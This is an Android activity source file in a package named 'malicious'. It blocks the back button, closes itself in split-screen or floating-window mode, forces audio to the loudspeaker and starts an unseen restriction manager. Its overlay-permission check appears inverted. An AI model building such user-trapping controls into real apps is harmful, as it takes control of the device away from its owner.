package com.example.malicious;

import android.annotation.SuppressLint;
import android.media.AudioManager;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.view.View;
import android.widget.Switch;
import android.widget.Toast;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import java.util.concurrent.Executors;

import com.example.loudspeaker.AudioUtils;
import com.example.loudspeaker.HeadsetReceiver;
import com.example.loudspeaker.BluetoothReceiver;
import com.example.utils.PermissionChecks;
import com.example.utils.RestrictionManager;


public class MainActivity extends AppCompatActivity  {
    private final RestrictionManager restrictionManager = new RestrictionManager(this, Executors.newScheduledThreadPool(1));
    private final HeadsetReceiver headsetReceiver = new HeadsetReceiver();
    private final BluetoothReceiver bluetoothReceiver = new BluetoothReceiver();


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState); // 调用父类方法
        setContentView(R.layout.activity_main); // 设置布局文件

        setVolumeControlStream(AudioManager.STREAM_MUSIC); // 设置音量控制流为媒体流
        onGlobalLayout(); // 监听布局大小
    };


    // 监听布局大小
    private void onGlobalLayout() {
        final View rootView = findViewById(android.R.id.content);
        rootView.getViewTreeObserver().addOnGlobalLayoutListener(() -> {
            // 获取当前页面的宽度和高度
            final int width = rootView.getWidth();
            final int height = rootView.getHeight();

            // 获取屏幕的宽度和高度
            final DisplayMetrics displayMetrics = new DisplayMetrics();
            getWindowManager().getDefaultDisplay().getMetrics(displayMetrics);
            final int screenWidth = displayMetrics.widthPixels;
            final int screenHeight = displayMetrics.heightPixels;

            // 判断是否处于小窗模式或悬浮窗模式
            if (width < screenWidth || height < screenHeight) finish(); // 强制退出应用
        });
    };


    // 禁止返回键
    @SuppressLint("MissingSuperCall")
    @Override
    public void onBackPressed() {};



    // 处理 Switch 点击事件的方法
    public void onSwitchClicked(final View view) {
        // 检查悬浮窗权限
        if (PermissionChecks.hasOverlayPermission(this)) {
            startActivity(PermissionChecks.getOverlayPermissionIntent(this));
            handleButton();
            Toast.makeText(this, "该功能需要悬浮窗权限", Toast.LENGTH_SHORT).show();
        } else {
            if (view.getId() == R.id.switch4) {
                Toast.makeText(this, "该功能暂未开放, 请选择其他功能", Toast.LENGTH_SHORT).show();
                return;
            };
            headsetReceiver.register(this); // 注册耳机接收器
            bluetoothReceiver.register(this); // 注册蓝牙接收器
            AudioUtils.setAudioOutputToSpeaker(this); // 设置音频输出到扬声器
            restrictionManager.startRestriction(); // 启用限制
        };
    };


    // 按钮处理
    private void handleButton() {
        final int[] switchIds = {R.id.switch1, R.id.switch2, R.id.switch3, R.id.switch4};
        for (final int id : switchIds) {
            @SuppressLint("UseSwitchCompatOrMaterialCode") final Switch switchView = findViewById(id);
            switchView.setChecked(false);
        };
    };
};